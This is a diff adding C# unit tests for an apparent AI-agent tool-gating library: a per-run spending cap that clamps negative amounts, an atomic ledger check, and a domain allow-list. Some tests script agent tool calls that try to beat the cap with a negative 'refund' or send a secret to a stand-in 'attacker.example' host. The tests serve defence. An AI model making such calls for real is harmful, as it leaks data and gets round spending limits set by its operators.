@@ -132,10 +132,76 @@ public class BeachheadGatesTests
     }
 
     [Fact]
+    public async Task RunBudget_NegativeAmount_CannotManufactureHeadroom()
+    {
+        // A negative "refund" must NOT reduce the running sum (or an attacker interleaves negatives to bypass the cap).
+        var executed = 0;
+        var pay = AIFunctionFactory.Create((int amount) => { Interlocked.Increment(ref executed); return "ok"; }, "pay");
+        var model = new ScriptedChatClient()
+            .AddToolCall("c1", "pay", new Dictionary<string, object?> { ["amount"] = 60 })
+            .AddToolCall("c2", "pay", new Dictionary<string, object?> { ["amount"] = -1000 })   // would drive sum to -940 without the clamp
+            .AddToolCall("c3", "pay", new Dictionary<string, object?> { ["amount"] = 60 })
+            .AddText("done");
+
+        await BudgetAgent(new RunBudgetGate(maxMonetaryPerRun: ("amount", 100m)), model, pay).RunAsync("go");
+
+        // c1 (sum 60) + c2 (clamped to 0, sum stays 60) run; c3 would make 120 > 100 → blocked. Bypass closed.
+        Assert.Equal(2, executed);
+    }
+
+    [Fact]
     public void RunBudget_NoBudget_Throws()
         => Assert.Throws<ArgumentException>(() => new RunBudgetGate());
 
     [Fact]
     public void RunBudget_ZeroMaxToolCalls_Throws()
         => Assert.Throws<ArgumentOutOfRangeException>(() => new RunBudgetGate(maxToolCalls: 0));
+
+    // ─────────────────────────── RunLedger atomic admit ───────────────────────────
+
+    [Fact]
+    public void RunLedger_TryAdmit_ChecksAndRecordsAtomically()
+    {
+        var ledger = new RunLedger();
+        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
+        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
+        Assert.Equal(RunBudgetDecision.TotalExceeded, ledger.TryAdmitToolCall("t", maxTotal: 2, maxPerTool: null, monetaryArg: null, monetaryAmount: 0m, maxMonetary: 0m));
+        Assert.Equal(2, ledger.TotalToolCalls);   // the rejected call was not recorded
+    }
+
+    [Fact]
+    public void RunLedger_TryAdmit_NegativeAmount_DoesNotReduceSum()
+    {
+        var ledger = new RunLedger();
+        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", null, null, "amount", 100m, 100m));
+        // A negative amount is clamped to 0 inside the ledger — the sum stays at 100, not 100 + (-100).
+        Assert.Equal(RunBudgetDecision.Admitted, ledger.TryAdmitToolCall("t", null, null, "amount", -100m, 100m));
+        Assert.Equal(100m, ledger.MonetarySum("amount"));
+    }
+
+    // ─────────────────────────── DomainAllowListGate — extra egress forms ───────────────────────────
+
+    [Fact]
+    public async Task DomainAllowList_SchemeRelativeUrl_Blocks()
+    {
+        var gate = new DomainAllowListGate(["example.com"]);
+        var v = await gate.InspectAsync(Call("http_post", new Dictionary<string, object?> { ["url"] = "//attacker.example/collect?d=secret" }));
+        Assert.Equal(ToolGateAction.Block, v.Action);
+    }
+
+    [Fact]
+    public async Task DomainAllowList_NonHttpScheme_Blocks()
+    {
+        var gate = new DomainAllowListGate(["example.com"]);
+        var v = await gate.InspectAsync(Call("fetch", new Dictionary<string, object?> { ["url"] = "ftp://attacker.example/x" }));
+        Assert.Equal(ToolGateAction.Block, v.Action);
+    }
+
+    [Fact]
+    public async Task DomainAllowList_QueryString_DoesNotFoldIntoHost_Allows()
+    {
+        var gate = new DomainAllowListGate(["example.com"]);
+        var v = await gate.InspectAsync(Call("fetch", new Dictionary<string, object?> { ["url"] = "https://api.example.com?token=abc" }));
+        Assert.Equal(ToolGateAction.Allow, v.Action);
+    }
 }
